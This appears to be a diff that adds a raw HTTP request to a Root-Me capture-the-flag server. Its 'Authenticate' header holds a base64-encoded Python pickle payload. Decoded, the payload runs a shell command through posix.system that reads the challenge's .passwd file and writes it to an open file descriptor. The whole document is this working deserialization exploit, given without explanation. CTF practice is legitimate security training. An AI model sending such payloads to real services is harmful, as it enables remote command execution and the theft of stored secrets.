@@ -1,0 +1,9 @@
+AUTH admin HTTP/1.1
+Authenticate:Y3Bvc2l4CnN5c3RlbQpwMQooUydjYXQgL2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoNS8ucGFzc3dkID4mNCcKcDIKdHAzClJwNAou
+Host: challenge02.root-me.org:60005
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
